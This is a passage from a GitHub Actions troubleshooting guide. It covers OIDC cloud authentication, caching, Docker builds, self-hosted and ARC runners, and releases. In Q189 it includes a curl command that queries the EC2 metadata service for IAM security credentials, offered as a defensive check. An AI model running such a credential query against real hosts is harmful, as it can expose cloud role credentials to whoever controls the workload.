<summary><b>Answer</b></summary>

**Likely causes →** The org secret's visibility is "Private repositories" but the repo is internal, or "Selected repositories" no longer includes it; or the plan does not allow org secrets for private repos.

**Diagnose →**
```bash
gh api orgs/devopsshack/actions/secrets/NEXUS_TOKEN --jq .visibility
gh api orgs/devopsshack/actions/secrets/NEXUS_TOKEN/repositories --jq '.repositories[].name'
```

**Fix →** Add the repo to selected repos or change visibility.

**Prevent →** Manage org secrets with Terraform (`github_actions_organization_secret`) so access is reviewed.

</details>

### Q148. Workflows suddenly fail with permission errors across many repos after an org policy change. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Org default workflow permissions switched to read-only, and workflows relied on implicit write.

**Diagnose →** Search for workflows without `permissions:` that write (push, release, comment).

**Fix →** Add explicit `permissions` to affected workflows; do not revert the org default.

**Prevent →** Before flipping defaults, scan repos and open PRs adding explicit permissions.

</details>

---

## OIDC & Cloud Authentication

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q149. `Error: Could not assume role with OIDC: Not authorized to perform sts:AssumeRoleWithWebIdentity` 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Trust policy `sub` does not match the token's actual `sub` (most often: the job uses an `environment`, so `sub` is `repo:ORG/REPO:environment:prod`, not the `ref:` form), wrong `aud`, wrong repo or org name casing, wrong OIDC provider ARN or account.

**Diagnose →** Print the claims of the token:
```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const t = await core.getIDToken('sts.amazonaws.com');
      core.info(Buffer.from(t.split('.')[1], 'base64').toString());
```
Compare `sub` and `aud` with `aws iam get-role --role-name gha-deploy-prod --query Role.AssumeRolePolicyDocument`.

**Fix →** Update the trust condition to the real `sub`.

**Prevent →** Template trust policies in Terraform with the environment form for environment-bound jobs.

</details>

### Q150. `Error: Credentials could not be loaded, please check your action inputs: Could not load credentials from any providers` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The job lacks `id-token: write`, so `configure-aws-credentials` cannot get an OIDC token and falls back to looking for keys; or `role-to-assume` is empty (a variable not set in this environment).

**Diagnose →** Check permissions and that `vars.DEPLOY_ROLE_ARN` resolves (print it, it is not secret).

**Fix →** Add `permissions: id-token: write` (plus `contents: read`) and set the variable at the correct level.

**Prevent →** Fail fast: `test -n "$ROLE_ARN" || { echo "::error::DEPLOY_ROLE_ARN not set"; exit 1; }`.

</details>

### Q151. `Error: Unable to get ACTIONS_ID_TOKEN_REQUEST_URL env variable` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `id-token: write` missing for the job, or for reusable workflows, missing in the **caller** job's permissions (the called workflow cannot elevate); or a fork PR where OIDC is not available with write.

**Diagnose →** Check permissions at caller and callee.

**Fix →** Grant `id-token: write` on the calling job and in the called job.

**Prevent →** Standard permission snippet in the reusable workflow's README.

</details>

### Q152. OIDC works on `main` but fails on a tag-triggered release workflow. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Trust policy only allows `repo:ORG/REPO:ref:refs/heads/main`; tag runs have `sub` `repo:ORG/REPO:ref:refs/tags/v1.4.0`.

**Diagnose →** Decode the token claims in the failing run.

**Fix →** Add a `StringLike` condition for `repo:ORG/REPO:ref:refs/tags/v*`, or bind the release job to an environment and trust the environment subject.

**Prevent →** Use environments for every privileged job so `sub` is predictable.

</details>

### Q153. `An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The OIDC provider's client ID list does not include the token's `aud` (default `sts.amazonaws.com` for the AWS action), or a custom `audience` input was set.

**Diagnose →**
```bash
aws iam get-open-id-connect-provider --open-id-connect-provider-arn arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com
```

**Fix →** `aws iam add-client-id-to-open-id-connect-provider --client-id sts.amazonaws.com --open-id-connect-provider-arn ...` or align the `audience` input.

**Prevent →** Keep the default audience unless you have a reason.

</details>

### Q154. `No OpenIDConnect provider found in your account for https://token.actions.githubusercontent.com` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The provider was never created in this AWS account (common in multi-account setups), or the role trusts a provider ARN in another account.

**Diagnose →**
```bash
aws iam list-open-id-connect-providers
```

**Fix →** Create the provider in the account that owns the role and reference its ARN in the trust policy.

**Prevent →** Create the provider in every account via Terraform baseline.

</details>

### Q155. After assuming the role, `aws ecr get-login-password` works but push fails: `denied: User: arn:aws:sts::111122223333:assumed-role/gha-ecr-push/gha-123 is not authorized to perform: ecr:InitiateLayerUpload on resource: arn:aws:ecr:ap-south-1:111122223333:repository/shack-api` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The role's permission policy lacks push actions on that repository ARN (or the region or repo name differs).

**Diagnose →**
```bash
aws iam list-attached-role-policies --role-name gha-ecr-push
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::111122223333:role/gha-ecr-push \
  --action-names ecr:InitiateLayerUpload --resource-arns arn:aws:ecr:ap-south-1:111122223333:repository/shack-api
```

**Fix →** Allow `ecr:BatchCheckLayerAvailability`, `ecr:InitiateLayerUpload`, `ecr:UploadLayerPart`, `ecr:CompleteLayerUpload`, `ecr:PutImage`, `ecr:BatchGetImage` on the repo ARN, and `ecr:GetAuthorizationToken` on `*`.

**Prevent →** Keep a reviewed push-policy module.

</details>

### Q156. `error: You must be logged in to the server (Unauthorized)` from kubectl on EKS after OIDC login. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The IAM role is not mapped into the cluster: no EKS access entry (or `aws-auth` ConfigMap entry), wrong cluster or region in `update-kubeconfig`, or the cluster's authentication mode is `CONFIG_MAP` only and you created access entries.

**Diagnose →**
```bash
aws sts get-caller-identity
aws eks describe-cluster --name shack --query cluster.accessConfig
aws eks list-access-entries --cluster-name shack
```

**Fix →**
```bash
aws eks create-access-entry --cluster-name shack --principal-arn arn:aws:iam::111122223333:role/gha-deploy-prod
aws eks associate-access-policy --cluster-name shack --principal-arn arn:aws:iam::111122223333:role/gha-deploy-prod \
  --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSEditPolicy \
  --access-scope type=namespace,namespaces=shack-prod
```

**Prevent →** Manage access entries in Terraform alongside the role.

</details>

### Q157. kubectl now authenticates but returns `Error from server (Forbidden): deployments.apps "shack-api" is forbidden: User "arn:aws:sts::111122223333:assumed-role/gha-deploy-prod/gha-987" cannot patch resource "deployments" in API group "apps" in the namespace "shack-staging"` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The access policy is scoped to a different namespace, or the workflow targets the wrong namespace for the environment.

**Diagnose →**
```bash
aws eks list-associated-access-policies --cluster-name shack --principal-arn arn:aws:iam::111122223333:role/gha-deploy-prod
kubectl auth can-i patch deployments -n shack-staging
```

**Fix →** Correct the namespace in the workflow, or the scope in the access policy.

**Prevent →** Derive namespace from the environment name (`shack-${{ inputs.environment }}`) so they cannot diverge.

</details>

### Q158. `AADSTS70021: No matching federated identity record found for presented assertion. Assertion Issuer: 'https://token.actions.githubusercontent.com'. Assertion Subject: 'repo:devopsshack/shack-api:environment:prod'.` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The Entra federated credential subject differs (configured for `ref:refs/heads/main` but the job uses an environment), wrong issuer or audience.

**Diagnose →** The error prints the actual subject; compare with:
```bash
az ad app federated-credential list --id $APP_ID -o table
```

**Fix →** Add a federated credential with subject `repo:devopsshack/shack-api:environment:prod`.

**Prevent →** Create one federated credential per environment in IaC.

</details>

### Q159. GCP: `Permission 'iam.serviceAccounts.getAccessToken' denied on resource (or it may not exist).` 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The workload identity principal lacks `roles/iam.workloadIdentityUser` on the service account, the attribute mapping does not produce the attribute used in the binding, or the attribute condition rejected the token.

**Diagnose →**
```bash
gcloud iam service-accounts get-iam-policy deployer@shack-prod.iam.gserviceaccount.com
gcloud iam workload-identity-pools providers describe github --workload-identity-pool=github-pool --location=global
```

**Fix →**
```bash
gcloud iam service-accounts add-iam-policy-binding deployer@shack-prod.iam.gserviceaccount.com \
  --role roles/iam.workloadIdentityUser \
  --member "principalSet://iam.googleapis.com/projects/123456/locations/global/workloadIdentityPools/github-pool/attribute.repository/devopsshack/shack-api"
```

**Prevent →** Keep pool, provider and bindings in Terraform.

</details>

### Q160. Assumed-role credentials expire mid-job: `ExpiredToken: The security token included in the request is expired` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The job runs longer than the session duration (default 1 hour), for example long Terraform applies or big image builds.

**Diagnose →** Compare job duration with `role-duration-seconds`.

**Fix →** Set `role-duration-seconds: 7200` and raise the role's `MaxSessionDuration`, or re-run `configure-aws-credentials` before the late steps.

**Prevent →** Split long jobs; authenticate right before the cloud steps.

</details>

### Q161. A PR workflow intended to use the read-only role fails with AccessDenied, but `main` works. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** PR token `sub` is `repo:ORG/REPO:pull_request`; the trust allows only the `ref` form. Or the PR is from a fork where OIDC tokens are not issued with write.

**Diagnose →** Decode claims; check fork status.

**Fix →** Add a separate role trusting `repo:ORG/REPO:pull_request` with read-only permissions.

**Prevent →** Document the four `sub` forms in your platform guide.

</details>

### Q162. OIDC with a custom `sub` template stopped working for every repo after an org change. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Someone customized the org OIDC `sub` claim (for example to include `job_workflow_ref`), changing the format for all repos that use the default, so existing trust policies no longer match.

**Diagnose →**
```bash
gh api orgs/devopsshack/actions/oidc/customization/sub
gh api repos/devopsshack/shack-api/actions/oidc/customization/sub
```

**Fix →** Revert, or opt specific repos back to default (`use_default: true`), then migrate trust policies deliberately.

**Prevent →** Treat the `sub` template as a breaking API change with a migration plan.

</details>

---

## Caching, Artifacts, Builds & Scans

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q163. `Cache not found for input keys: npm-Linux-3f9a...` on every single run. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The key contains something that changes every run (`github.sha`, `run_id`, a timestamp), the lockfile is not committed so `hashFiles` returns empty, no `restore-keys` fallback, or caches were saved only on PR refs and are invisible to other branches.

**Diagnose →**
```bash
gh cache list --limit 20
git ls-files | grep lock
```

**Fix →** Key on lockfile hash only, add `restore-keys`, commit lockfiles, warm caches from `main`.

**Prevent →** Use setup-* built-in caching, which generates correct keys.

</details>

### Q164. `Failed to save: Unable to reserve cache with key npm-Linux-3f9a..., another job may be creating this cache.` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Several matrix legs or parallel jobs try to save the same key; only the first succeeds. Harmless, but noisy.

**Diagnose →** Check which jobs share the key.

**Fix →** Include matrix values in the key when contents differ, or save from one leg only with `actions/cache/save` and an `if`.

**Prevent →** Design keys per OS, arch and toolchain version.

</details>

### Q165. A cache restores but the build is still slow and reinstalls everything. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Cached the wrong path (`node_modules` with `npm ci`, which deletes it), path mismatch between OS (`~/.npm` vs `%AppData%`), restore-key hit an old cache with mostly stale content, or the tool uses a different cache directory (Yarn Berry, pnpm store).

**Diagnose →** `npm config get cache`, `pnpm store path`, check restored size in logs.

**Fix →** Cache the tool's real cache path, or use setup-node's `cache: pnpm`.

**Prevent →** Measure step durations with and without cache.

</details>

### Q166. `Error: Failed to CreateArtifact: Received non-retryable error: Failed request: (409) Conflict: an artifact with this name already exists on the workflow run` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** artifacts v4 are immutable; multiple matrix legs or a re-uploaded step use the same name.

**Diagnose →** Find all `upload-artifact` steps with that `name`.

**Fix →** Unique names per leg (`name: results-${{ matrix.os }}-${{ matrix.node }}`), merge downstream:
```yaml
- uses: actions/download-artifact@v4
  with:
    pattern: results-*
    merge-multiple: true
    path: results
```
Or `overwrite: true` when re-uploading in the same job is intentional.

**Prevent →** Template artifact names with matrix values.

</details>

### Q167. `Error: Unable to download artifact(s): Artifact not found for name: build` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Download job does not `needs` the upload job (runs in parallel), the name differs, the artifact is from another run (needs `run-id` and `github-token`), or it expired.

**Diagnose →**
```bash
gh run view <id> --json jobs
gh api repos/ORG/REPO/actions/runs/<id>/artifacts --jq '.artifacts[].name'
```

**Fix →** Add `needs`, align names, pass `run-id` and `github-token: ${{ github.token }}` with `actions: read` for cross-run.

**Prevent →** Use `if-no-files-found: error` on upload so missing artifacts fail early.

</details>

### Q168. `Warning: No files were found with the provided path: coverage/. No artifacts will be uploaded.` but tests ran. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Coverage written to a different directory, `working-directory` used for tests but the upload path is relative to the workspace root, or the test step failed and coverage was not written.

**Diagnose →** Add `ls -R` before upload; check `defaults.run.working-directory`.

**Fix →** Use the correct path (`services/api/coverage/`), add `if: ${{ !cancelled() }}` to upload even after test failure.

**Prevent →** `if-no-files-found: error`.

</details>

### Q169. `ERROR: failed to solve: failed to compute cache key: failed to calculate checksum of ref ...: "/package-lock.json": not found` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The Docker build context is not where the Dockerfile expects (`context: .` vs `services/api`), `.dockerignore` excludes the file, or checkout did not include it (sparse).

**Diagnose →**
```bash
cat .dockerignore
ls services/api
```

**Fix →** Set `context: services/api` and `file: services/api/Dockerfile`, fix `.dockerignore`.

**Prevent →** Build locally with the same context path as CI.

</details>

### Q170. `System.IO.IOException: No space left on device` on a hosted runner during a Docker build. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Standard runners have about 14 GB free; large images, layer caches and test data exhaust it.

**Diagnose →** `df -h` and `docker system df` in a step.

**Fix →** Free space at the start (remove preinstalled toolchains you do not use):
```bash
sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc /opt/hostedtoolcache/CodeQL
docker system prune -af
```
or use a larger runner, or shrink the image with multi-stage builds.

**Prevent →** Track image size in CI and fail on regressions.

</details>

### Q171. `tag invalid: The image tag 'sha-a1b2c3d' already exists in the 'shack-api' repository and cannot be overwritten because the repository is immutable.` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A re-run or a second workflow pushes the same commit tag again; ECR tag immutability is on (good).

**Diagnose →**
```bash
aws ecr describe-images --repository-name shack-api --image-ids imageTag=sha-a1b2c3d
```

**Fix →** Make the push idempotent: skip build and push if the tag exists and output the existing digest; never push mutable tags like `latest` to an immutable repo.

**Prevent →** Check-then-push step at the start of the build job.

</details>

### Q172. Trivy fails with `FATAL Fatal error init error: DB error: failed to download vulnerability DB ... TOOMANYREQUESTS: retry-after` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Rate limiting on the default DB registry (GHCR) shared across many runners.

**Diagnose →** Look for `TOOMANYREQUESTS` or 429 in the Trivy output.

**Fix →** Use the mirror and cache the DB:
```yaml
env:
  TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2
  TRIVY_JAVA_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-java-db:1
```
plus `actions/cache` on `~/.cache/trivy` keyed by date.

**Prevent →** A nightly job that refreshes a cached DB, or an internal mirror.

</details>

### Q173. Trivy blocks the pipeline on a CRITICAL CVE in a base image package with no fix available. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Gate configured without `--ignore-unfixed`, or the base image is outdated.

**Diagnose →**
```bash
trivy image --severity CRITICAL,HIGH --format table $IMAGE
```

**Fix →** Rebuild on the latest base or switch to a smaller base (distroless, alpine); gate with `ignore-unfixed: true`; for accepted risk, add a `.trivyignore` entry with CVE, reason and expiry date reviewed by security.

**Prevent →** Weekly scheduled rebuilds to pick up base image patches.

</details>

### Q174. `buildx failed with: ERROR: failed to solve: failed to push 111122223333.dkr.ecr.ap-south-1.amazonaws.com/shack-api:sha-a1b2c3d: unexpected status from HEAD request ... 401 Unauthorized` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** No `docker login` to ECR (missing `aws-actions/amazon-ecr-login`), login done before credentials were configured, region mismatch, or login token expired in a very long job.

**Diagnose →** Check step order: configure-aws-credentials, then amazon-ecr-login, then build.

**Fix →**
```yaml
- uses: aws-actions/configure-aws-credentials@v4
  with: { role-to-assume: "${{ vars.ECR_PUSH_ROLE_ARN }}", aws-region: ap-south-1 }
- id: ecr
  uses: aws-actions/amazon-ecr-login@v2
```

**Prevent →** Keep auth steps immediately before the push.

</details>

### Q175. An image built on a hosted runner fails in EKS Graviton nodes with `exec format error`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Built amd64 only on an x64 runner, deployed to arm64 nodes.

**Diagnose →**
```bash
docker buildx imagetools inspect $IMAGE:sha-a1b2c3d
```

**Fix →** Build multi-arch (`platforms: linux/amd64,linux/arm64`, ideally native arm runners and a manifest merge), or pin node affinity to amd64.

**Prevent →** Add a check that the manifest contains every platform your clusters run.

</details>

### Q176. Docker layer cache (`type=gha`) never hits on PR builds. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Cache only written from PR refs (invisible to other PRs), cache evicted due to the 10 GB quota, `scope` differs between writers and readers, or the build context changes early layers each time (copying source before installing dependencies).

**Diagnose →** `gh cache list --key buildkit` and build logs showing `CACHED` vs rebuilt layers.

**Fix →** Write cache from `main`, keep scopes consistent, reorder Dockerfile, consider registry cache.

**Prevent →** Monitor cache size and hit rates.

</details>

---

## Runners, Self-hosted & ARC

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q177. Job stuck at `Waiting for a runner to pick up this job...` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `runs-on` labels match no online runner (typo, retired image label), runner offline or busy, repo not allowed in the runner group, account concurrency limit reached, or ARC scale set at `maxRunners`.

**Diagnose →**
```bash
gh api orgs/ORG/actions/runners --jq '.runners[] | {name, status, busy, labels: [.labels[].name]}'
gh api orgs/ORG/actions/runner-groups --jq '.runner_groups[] | {name, visibility}'
kubectl get ephemeralrunners -n arc-runners
```

**Fix →** Correct labels, bring runners online, add the repo to the group, raise `maxRunners`.

**Prevent →** Alert on queue time and runner availability.

</details>

### Q178. `This request was automatically failed because there were no enabled runners online to process the request for more than 1 days.` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A job queued 24 hours with no matching runner, often an old label like `ubuntu-20.04` after retirement or a decommissioned self-hosted fleet.

**Diagnose →** Check `runs-on` value in the failed job.

**Fix →** Update to a current label; restore the runner fleet.

**Prevent →** Track GitHub runner image deprecation announcements and search org workflows for retired labels.

</details>

### Q179. `Must not run with sudo` when running `./config.sh`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The runner configuration script refuses root.

**Diagnose →** `whoami`.

**Fix →** Create a dedicated user (`useradd -m runner`), run `config.sh` as that user, then install the service with `sudo ./svc.sh install runner`. In containers, set `RUNNER_ALLOW_RUNASROOT=1` only if you understand the implications.

**Prevent →** Bake a non-root runner user into the runner image or AMI.

</details>

### Q180. `Http response code: NotFound from 'POST https://api.github.com/actions/runner-registration'` during `config.sh`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The registration token expired (valid one hour), was for a different scope (repo token used with org URL), or the URL is wrong.

**Diagnose →** Compare `--url` with where the token was created.

**Fix →**
```bash
TOKEN=$(gh api -X POST orgs/devopsshack/actions/runners/registration-token --jq .token)
./config.sh --url https://github.com/devopsshack --token "$TOKEN" --unattended
```

**Prevent →** Generate tokens just in time in automation, or use JIT configs.

</details>

### Q181. Self-hosted runner logs: `Runner version v2.311.0 is deprecated and cannot receive messages.` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Auto-update disabled (`--disableupdate`) or blocked by network, and the runner fell below the minimum supported version.

**Diagnose →** `./run.sh --version`; check runner logs in `_diag/`.

**Fix →** Upgrade the runner binary or rebuild the runner image with the latest release.

**Prevent →** If auto-update is disabled, automate image rebuilds on new runner releases (Renovate on the runner version).

</details>

### Q182. `fatal: detected dubious ownership in repository at '/__w/app/app'` in a container job on a self-hosted runner. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Workspace owned by a different UID than the container user (root vs runner user), triggering git's safe.directory check.

**Diagnose →** `ls -ln` in the workspace and `id` in the container.

**Fix →** `git config --global --add safe.directory "$GITHUB_WORKSPACE"`, or run the container with the runner's UID (`options: --user 1001`).

**Prevent →** Ephemeral runners and consistent UIDs across images.

</details>

### Q183. Self-hosted runner jobs fail with `EACCES: permission denied, unlink '/home/runner/_work/app/app/dist/index.js'` at checkout. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A previous container job wrote root-owned files into the persistent workspace; the runner user cannot delete them.

**Diagnose →** `find _work -user root | head`.

**Fix →** Clean with a privileged cleanup (`docker run --rm -v $PWD:/w alpine rm -rf /w/dist`), then run containers as the runner UID.

**Prevent →** Ephemeral runners, or a job-completed hook that resets ownership.

</details>

### Q184. ARC listener pod logs `failed to get runner registration token ... 401 Bad credentials`. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The GitHub App private key, app ID or installation ID in the secret is wrong, the app is not installed on the org or repo in `githubConfigUrl`, or the PAT expired.

**Diagnose →**
```bash
kubectl logs -n arc-systems -l app.kubernetes.io/component=runner-scale-set-listener --tail=50
kubectl get secret gh-app -n arc-runners -o jsonpath='{.data.github_app_installation_id}' | base64 -d
```

**Fix →** Recreate the secret with correct values; install the app with Actions and Administration permissions required by ARC.

**Prevent →** Manage the secret via External Secrets with alerts on listener restarts.

</details>

### Q185. ARC runner pods stay `Pending`; jobs wait. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Insufficient node capacity, resource requests too large, nodeSelector or taints not matched, PVC not bound (kubernetes mode), or ResourceQuota exceeded.

**Diagnose →**
```bash
kubectl get pods -n arc-runners
kubectl describe pod <runner-pod> -n arc-runners | sed -n '/Events/,$p'
kubectl get resourcequota -n arc-runners
```

**Fix →** Scale nodes (Karpenter NodePool), fix tolerations and selectors, adjust requests, provide a storage class for the work volume.

**Prevent →** Alert on pods pending more than 2 minutes in runner namespaces.

</details>

### Q186. ARC job fails: `Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The scale set runs without `containerMode.type: dind` (or kubernetes mode, which has no Docker), so `docker build`, service containers or Docker actions cannot work.

**Diagnose →**
```bash
helm get values arc-linux -n arc-runners
```

**Fix →** Install a dedicated scale set with `--set containerMode.type=dind` for Docker workloads, or use a daemonless builder.

**Prevent →** Document which scale set supports Docker and route jobs via `runs-on`.

</details>

### Q187. Jobs on ARC fail at "Initialize containers" with `Error: Jobs without a job container are forbidden on this runner, please add a 'container:' to your job` 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The scale set uses kubernetes container mode with `ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER=true`, which requires every job to declare `container:`.

**Diagnose →** Check the scale set's template env and container mode.

**Fix →** Add `container: image: ...` to the job, or set the variable to `false` if host execution is acceptable.

**Prevent →** Publish a runner usage guide per scale set.

</details>

### Q188. ARC scales to `maxRunners` and stays there with idle pods. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Runner pods failing to register (image or network issue) so the listener keeps requesting more, stuck `EphemeralRunner` objects with finalizers, or controller and scale set version mismatch.

**Diagnose →**
```bash
kubectl get ephemeralrunners -n arc-runners -o wide
kubectl logs -n arc-systems deploy/arc-gha-rs-controller --tail=100
helm list -A | grep gha-runner
```

**Fix →** Fix the registration issue, delete stuck ephemeral runners, align chart versions.

**Prevent →** Pin and upgrade controller and scale sets together; monitor `gha_*` listener metrics.

</details>

### Q189. Runner jobs on EKS can call AWS with the node's role, which they should not. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Pods can reach the EC2 instance metadata service (IMDS) and inherit the node IAM role.

**Diagnose →** In a job: `curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

**Fix →** Enforce IMDSv2 with hop limit 1 on runner nodes (launch template or Karpenter `metadataOptions.httpPutResponseHopLimit: 1`), or block with a NetworkPolicy; use OIDC in workflows instead.

**Prevent →** Include the IMDS check in your runner security tests.

</details>

### Q190. `The runner has received a shutdown signal. This can happen when the runner service is stopped, or a manually started runner is canceled.` on hosted or ARC runners. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Self-hosted: the VM or pod was terminated (spot interruption, node scale-down, OOM-killed runner). Hosted: rare infrastructure issue or the job exhausted memory and the VM became unresponsive.

**Diagnose →** `kubectl get events -n arc-runners`, node termination events, Karpenter logs; on hosted, check memory usage patterns.

**Fix →** Add a PodDisruptionBudget or `karpenter.sh/do-not-disrupt: "true"` annotation on runner pods, use on-demand for long jobs, reduce memory use; re-run the job.

**Prevent →** Keep jobs idempotent and short so interruptions are cheap.

</details>

---

## Deployments, Environments & Releases

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q191. `Branch "feature/login" is not allowed to deploy to prod due to environment protection rules.` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Working as designed: the prod environment only allows `main` and release tags, and someone dispatched from a feature branch.

**Diagnose →**
```bash
gh api repos/ORG/REPO/environments/prod/deployment-branch-policies --jq '.branch_policies[].name'
```

**Fix →** Merge to `main` and deploy from there or via a release tag.

**Prevent →** Restrict the `workflow_dispatch` UI documentation to say "run from main".

</details>

### Q192. Deploy job shows `Waiting for review: prod needs approval to start deploying changes` but no reviewer got notified. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Reviewers are a team with notifications disabled, the only reviewer is the triggering user with prevent self-review on, or reviewers lack repo access.

**Diagnose →**
```bash
gh api repos/ORG/REPO/environments/prod --jq '.protection_rules'
```

**Fix →** Add a team with at least two members and repo access; route approval notifications to Slack.

**Prevent →** Review environment configs quarterly.

</details>

### Q193. `Canceling since a higher priority waiting request for 'deploy-prod' exists` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Concurrency group behaviour: a newer run joined the group, so the older pending run was cancelled (or the running one with `cancel-in-progress: true`).

**Diagnose →** Find the concurrency group definition and the competing run.

**Fix →** Expected for "deploy latest" semantics. If every version must deploy, remove `cancel-in-progress` and accept that only one pending run is kept, or redesign to queue via a different mechanism.

**Prevent →** Explain the one-running-one-pending rule in team docs.

</details>

### Q194. `kubectl rollout status` timed out: `error: deployment "shack-api" exceeded its progress deadline` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** New pods failing readiness (bad config, missing secret, crash), image pull errors (wrong digest or no ECR pull permission on nodes), or insufficient capacity.

**Diagnose →**
```bash
kubectl -n shack-prod get pods -l app=shack-api
kubectl -n shack-prod describe pod <new-pod> | sed -n '/Events/,$p'
kubectl -n shack-prod logs <new-pod> --previous
```

**Fix →** Fix the cause; the workflow should run `kubectl rollout undo deployment/shack-api` automatically on failure.

**Prevent →** Dump pod events and logs to the job log on failure (`if: failure()` step) so on-call does not need cluster access.

</details>

### Q195. `ErrImagePull ... failed to resolve reference "111122223333.dkr.ecr.ap-south-1.amazonaws.com/shack-api@sha256:...": not found` after a deploy. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The digest output was from the local build (config digest or a platform-specific digest) rather than the pushed manifest digest, or the image was pushed to another region or account.

**Diagnose →**
```bash
aws ecr describe-images --repository-name shack-api --query 'imageDetails[?imageTags!=`null`]|[0:5].[imageTags,imageDigest]'
```

**Fix →** Take the digest from `docker/build-push-action` output `digest`, or after `docker push` from `docker inspect --format '{{index .RepoDigests 0}}'`.

**Prevent →** Verify the digest exists in the registry before deploying (`aws ecr describe-images --image-ids imageDigest=...`).

</details>

### Q196. Release workflow `gh release create` fails with `HTTP 403: Resource not accessible by integration` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Missing `contents: write`.

**Diagnose →** "GITHUB_TOKEN Permissions" in the log.

**Fix →** Add `permissions: contents: write` to the release job only.

**Prevent →** Template release workflows with correct permissions.

</details>

### Q197. `gh release create v1.4.0 --verify-tag` fails with `tag v1.4.0 doesn't exist in the repo`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The workflow was dispatched manually with a version input but nobody pushed the tag, or the tag exists locally only.

**Diagnose →** `git ls-remote --tags origin v1.4.0`.

**Fix →** Push the tag, or drop `--verify-tag` and pass `--target "$GITHUB_SHA"` to create it (with the no-trigger caveat for `GITHUB_TOKEN`).

**Prevent →** Trigger releases from tag pushes, not from free-text version inputs.

</details>

### Q198. Release notes generated by `--generate-notes` include unrelated commits from months ago. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The previous tag is not found (shallow checkout irrelevant here, but tag naming changed, for example `release-1.3` vs `v1.3.0`), so GitHub compares against an older tag.

**Diagnose →** `gh release list` and compare tag patterns.

**Fix →** Pass `--notes-start-tag v1.3.0` explicitly.

**Prevent →** Keep a consistent tag scheme and configure `.github/release.yml` categories.

</details>

